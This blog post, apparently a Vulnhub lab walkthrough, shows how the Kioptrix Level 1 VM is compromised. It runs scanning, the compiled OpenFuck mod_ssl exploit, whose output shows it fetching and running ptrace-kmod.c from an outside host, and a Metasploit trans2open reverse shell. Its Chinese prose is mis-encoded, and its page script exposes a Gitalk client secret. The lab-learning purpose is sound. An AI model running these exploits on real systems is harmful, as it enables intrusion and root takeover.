<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Kioptrix Level 1 - Vulnhub | Lucifiel&#39;s Blog | Lucifiel æŠ€æœ¯åšå®¢</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Vulnhub">
    <meta name="description" content="é¶åœºä¿¡æ¯This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games ar">
<meta property="og:type" content="article">
<meta property="og:title" content="Kioptrix Level 1 - Vulnhub">
<meta property="og:url" content="http://www.lucifiel.com/2021/11/13/Vulnhub%20%20-%20Kioptrix/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="é¶åœºä¿¡æ¯This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games ar">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2021/11/13/Vulnhub%20%20-%20Kioptrix/image1.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/11/13/Vulnhub%20%20-%20Kioptrix/image2.png">
<meta property="article:published_time" content="2021-11-13T00:36:20.000Z">
<meta property="article:modified_time" content="2023-05-19T10:37:26.620Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Vulnhub">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2021/11/13/Vulnhub%20%20-%20Kioptrix/image1.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                ä¸»é¡µ
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Kioptrix Level 1 - Vulnhub</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="è¾“å…¥æ„Ÿå…´è¶£çš„å…³é”®å­—">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Kioptrix Level 1 - Vulnhub</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-11-13T00:36:20.000Z" itemprop="datePublished" class="page-time">
  2021-11-13
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#é¶åœºä¿¡æ¯"><span class="post-toc-text">é¶åœºä¿¡æ¯</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ä¿¡æ¯æœé›†"><span class="post-toc-text">ä¿¡æ¯æœé›†</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#æ¼æ´åˆ©ç”¨"><span class="post-toc-text">æ¼æ´åˆ©ç”¨</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#æƒé™æå‡"><span class="post-toc-text">æƒé™æå‡</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Vulnhub  - Kioptrix"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Kioptrix Level 1 - Vulnhub</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-11-13 08:36:20" datetime="2021-11-13T00:36:20.000Z"  itemprop="datePublished">2021-11-13</time>

            


            
<span id="busuanzi_container_page_pv" title="æ–‡ç« æ€»é˜…è¯»é‡" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h2 id="é¶åœºä¿¡æ¯"><a href="#é¶åœºä¿¡æ¯" class="headerlink" title="é¶åœºä¿¡æ¯"></a>é¶åœºä¿¡æ¯</h2><pre><code>This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.
è¿™ä¸ªKioptrix VM Imageæ˜¯å¾ˆå®¹æ˜“çš„æŒ‘æˆ˜ã€‚æ¸¸æˆçš„ç›®çš„æ˜¯é€šè¿‡ä»»ä½•å¯èƒ½çš„æ‰‹æ®µè·å¾—rootæƒé™ï¼ˆé™¤äº†å®é™…å…¥ä¾µVMæœåŠ¡å™¨æˆ–ç©å®¶ï¼‰ã€‚è¿™äº›æ¸¸æˆçš„ç›®çš„æ˜¯å­¦ä¹ æ¼æ´è¯„ä¼°å’Œåˆ©ç”¨æ–¹é¢çš„åŸºæœ¬å·¥å…·å’ŒæŠ€æœ¯ã€‚æˆåŠŸå®Œæˆè¿™äº›æŒ‘æˆ˜çš„æ–¹æ³•æœ‰å¾ˆå¤šã€‚
</code></pre>
<pre><code>ä¸‹è½½åœ°å€
https://www.vulnhub.com/entry/kioptrix-level-1-1,22/
</code></pre>
<h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>é¦–å…ˆä½¿ç”¨arpè·å–é¶æœºçš„IPåœ°å€</p>
<pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5d:2e:77, IPv4: 192.168.1.106
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.102   00:0c:29:55:cb:15       VMware, Inc.

9 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 2.135 seconds (119.91 hosts/sec). 7 responded
</code></pre>
<p>ç¡®å®šé¶æœºIPåœ°å€ä¸º192.168.1.102ï¼Œä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ</p>
<pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 192.168.1.102
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 07:47 EST
Nmap scan report for 192.168.1.102
Host is up (0.00042s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1024/tcp   status
|_  100024  1           1024/udp   status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_ssl-date: 2021-11-12T13:50:26+00:00; +1h01m55s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
1024/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:55:CB:15 (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_clock-skew: 1h01m54s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.42 ms 192.168.1.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.83 seconds
</code></pre>
<p>è¿™ä¸œè¥¿ç¨å¾®çš„æœ‰ç‚¹å¤šï¼Œä¸€ä¸ªä¸ªçœ‹</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/11/13/Vulnhub%20%20-%20Kioptrix/image1.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>80ç«¯å£å¥½åƒä¹Ÿæ²¡å•¥å¯çœ‹çš„ï¼Ÿæ‰«ä¸ªç›®å½•çœ‹çœ‹å§</p>
<pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# gobuster dir -w /usr/share/dirb/wordlists/common.txt -x .php -e -t 200 -u http://192.168.1.102/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.102/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/11/12 07:52:42 Starting gobuster in directory enumeration mode
===============================================================
http://192.168.1.102/.htaccess            (Status: 403) [Size: 273]
http://192.168.1.102/.htpasswd            (Status: 403) [Size: 273]
http://192.168.1.102/.hta                 (Status: 403) [Size: 268]
http://192.168.1.102/.htaccess.php        (Status: 403) [Size: 277]
http://192.168.1.102/.htpasswd.php        (Status: 403) [Size: 277]
http://192.168.1.102/.hta.php             (Status: 403) [Size: 272]
http://192.168.1.102/~root                (Status: 403) [Size: 269]
http://192.168.1.102/~operator            (Status: 403) [Size: 273]
http://192.168.1.102/cgi-bin/             (Status: 403) [Size: 272]
http://192.168.1.102/index.html           (Status: 200) [Size: 2890]
http://192.168.1.102/manual               (Status: 301) [Size: 294] [--&gt; http://127.0.0.1/manual/]
http://192.168.1.102/mrtg                 (Status: 301) [Size: 292] [--&gt; http://127.0.0.1/mrtg/]
http://192.168.1.102/usage                (Status: 301) [Size: 293] [--&gt; http://127.0.0.1/usage/]
http://192.168.1.102/test.php             (Status: 200) [Size: 27]
</code></pre>
<p>æŒ¨ä¸ªå»çœ‹çœ‹</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/11/13/Vulnhub%20%20-%20Kioptrix/image2.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>å‡ ä¸ªé¡µé¢éƒ½ä¼šè·³è½¬åˆ°127.0.0.1ï¼Œåªæœ‰test.phpå¯ä»¥è®¿é—®ï¼Œè€Œä¸”è¿˜æ²¡ä»€ä¹ˆä¸œè¥¿</p>
<p>ç»§ç»­å›åˆ°ç«¯å£çœ‹çœ‹å§</p>
<pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# smbclient -L 192.168.1.102                                                                                                            1 â¨¯
protocol negotiation failed: NT_STATUS_IO_TIMEOUT
</code></pre>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>çœ‹åˆ°80ç«¯å£åé¢çš„mod_ssl&#x2F;2.8.4ï¼Œå»æœä¸€ä¸‹æœ‰æ²¡æœ‰Exploit</p>
<pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# searchsploit mod_ssl
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
Apache mod_ssl 2.0.x - Remote Denial of Service                                                             | linux/dos/24590.txt
Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                  | multiple/dos/21575.txt
Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuck.c&#39; Remote Buffer Overflow                                        | unix/remote/21671.c
Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow (1)                                  | unix/remote/764.c
Apache mod_ssl &lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow (2)                                  | unix/remote/47080.c
Apache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0.9.7-beta2 - &#39;openssl-too-open.c&#39; SSL2 KEY_ARG Overflow                | unix/remote/40347.txt
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
</code></pre>
<p>å¯¹æ¯”mod_ssl&#x2F;2.8.4ç‰ˆæœ¬ï¼Œæœ‰ä¸‰ä¸ªç‰ˆæœ¬åˆé€‚ï¼ŒæŒ¨ä¸ªè¿›è¡Œæµ‹è¯•</p>
<p>ç»è¿‡æµ‹è¯•å‘ç°unix&#x2F;remote&#x2F;47080.cæ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œå’±ä»¬ç»™ä»–å¤åˆ¶å‡ºæ¥</p>
<pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# locate unix/remote/47080.c
/usr/share/exploitdb/exploits/unix/remote/47080.c

â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# cp /usr/share/exploitdb/exploits/unix/remote/47080.c ./
</code></pre>
<p>ç„¶åä½¿ç”¨gccè¿›è¡Œç¼–è¯‘</p>
<pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# gcc -o exploit 47080.c -lcrypto
47080.c:21:10: fatal error: openssl/ssl.h: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•
   21 | #include &lt;openssl/ssl.h&gt;
      |          ^~~~~~~~~~~~~~~
compilation terminated.
</code></pre>
<p>æç¤ºæŠ¥é”™äº†ï¼Œç»è¿‡ç™¾åº¦æœç´¢ï¼Œå‘ç°æ˜¯ç¼ºå°‘äº†ç»„ä»¶</p>
<p>å’±ä»¬ä½¿ç”¨aptè¿›è¡Œå®‰è£…</p>
<pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# apt-get install libssl1.0-dev
</code></pre>
<p>ç„¶åå†è¿›è¡Œç¼–è¯‘</p>
<pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# gcc -o exploit 47080.c -lcrypto

â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ls
47080.c  exploit
</code></pre>
<p>å»è¿è¡Œä¸€ä¸‹</p>
<pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ./exploit

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./exploit target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
</code></pre>
<p>è¿è¡Œåå¾—åˆ°äº†è¿è¡Œå‚æ•°ï¼Œå’±ä»¬è¿˜å¾—å…ˆæ‰¾åˆ°å¯¹åº”çš„ç‰ˆæœ¬</p>
<pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ./exploit | grep apache-1.3.20                                                                                                        1 â¨¯
        0x02 - Cobalt Sun 6.0 (apache-1.3.20)
        0x27 - FreeBSD (apache-1.3.20)
        0x28 - FreeBSD (apache-1.3.20)
        0x29 - FreeBSD (apache-1.3.20+2.8.4)
        0x2a - FreeBSD (apache-1.3.20_1)
        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)
        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)
        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)
        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
        0x7e - Slackware Linux 8.0 (apache-1.3.20)
        0x86 - SuSE Linux 7.3 (apache-1.3.20)
</code></pre>
<p>ç¬¦åˆæ¡ä»¶çš„æœ‰ä¸¤ä¸ªï¼Œåˆ†åˆ«æ˜¯0x6aå’Œ0x6bï¼Œåˆ†åˆ«å»æµ‹è¯•ä¸€ä¸‹</p>
<pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ./exploit 0x6a 192.168.1.102 -c 40

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8070
Ready to send shellcode
Spawning shell...
Good Bye!
</code></pre>
<p>0x6aæµ‹è¯•å¤±è´¥ï¼Œç°åœ¨å»æµ‹è¯•ä¸€ä¸‹0x6b</p>
<pre><code>â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ./exploit 0x6b 192.168.1.102 -c 40

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f81e8
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$
d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo
--09:32:52--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           =&gt; `ptrace-kmod.c&#39;
Connecting to dl.packetstormsecurity.net:443... connected!

Unable to establish SSL connection.

Unable to establish SSL connection.
gcc: ptrace-kmod.c: No such file or directory
gcc: No input files
rm: cannot remove `ptrace-kmod.c&#39;: No such file or directory
bash: ./exploit: No such file or directory
bash-2.05$
bash-2.05$ whoami&amp;&amp;id
whoami&amp;&amp;id
apache
uid=48(apache) gid=48(apache) groups=48(apache)
</code></pre>
<p>0x6bæˆåŠŸgetshellï¼Œç°åœ¨å»ææƒ</p>
<h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h2><p>ç»è¿‡æµ‹è¯•åæ²¡æœ‰å‘ç°ææƒçš„ç‚¹ï¼Œä½†æ˜¯å‘ç°äº†å¦ä¸€ç§rootæƒé™çš„æ–¹æ³•ï¼Œé‚£å°±æ˜¯ç”¨msfçš„æ¨¡å—</p>
<pre><code>use exploit/linux/samba/trans2open
set payload linux/x86/shell_reverse_tcp
show options
set rhosts 192.168.1.102
exploit

msf6 exploit(linux/samba/trans2open) &gt; exploit

[*] Started reverse TCP handler on 192.168.1.106:4444
[*] 192.168.1.102:139 - Trying return address 0xbffffdfc...
[*] 192.168.1.102:139 - Trying return address 0xbffffcfc...
[*] 192.168.1.102:139 - Trying return address 0xbffffbfc...
[*] 192.168.1.102:139 - Trying return address 0xbffffafc...
[*] 192.168.1.102:139 - Trying return address 0xbffff9fc...
[*] 192.168.1.102:139 - Trying return address 0xbffff8fc...
[*] Command shell session 1 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1036) at 2021-11-13 07:04:24 -0500

[*] Command shell session 2 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1037) at 2021-11-13 07:04:25 -0500
[*] Command shell session 3 opened (192.168.1.106:4444 -&gt; 192.168.1.102:1038) at 2021-11-13 07:04:26 -0500
whoami&amp;&amp;id
root
uid=0(root) gid=0(root) groups=99(nobody)
</code></pre>
<p>ç”¨msfçš„æ¨¡å—æ‰“å°±æ˜¯rootï¼Œè‡³äºä¸ºå•¥æˆ‘ä¹Ÿæ²¡ç ”ç©¶å‡ºä¸ªæ‰€ä»¥ç„¶æ¥ï¼ˆä¸»è¦å› ä¸ºèœï¼‰</p>
<p>çŸ¥é“åŸå› çš„å°ä¼™ä¼´å¯ä»¥å‘Šè¯‰æˆ‘ä¸€ä¸‹</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/11/13/Vulnhub%20%20-%20Kioptrix/&title=ã€ŠKioptrix Level 1 - Vulnhubã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/11/13/Vulnhub%20%20-%20Kioptrix/&title=ã€ŠKioptrix Level 1 - Vulnhubã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/11/13/Vulnhub%20%20-%20Kioptrix/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠKioptrix Level 1 - Vulnhubã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2021/11/13/Vulnhub%20%20-%20Kioptrix/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/11/13/Vulnhub%20%20-%20Kioptrix/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2021/11/24/Hackthebox%20-%20Backdoor/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Backdoor - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2021/10/17/Vulnhub%20%20-%20Chill_Hack/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Chill_Hack - Vulnhub</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        ç«™ç‚¹æ€»è®¿å®¢æ•°ï¼š<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        ç«™ç‚¹æ€»è®¿é—®é‡ï¼š<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2023</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/11/13/Vulnhub%20%20-%20Kioptrix/&title=ã€ŠKioptrix Level 1 - Vulnhubã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
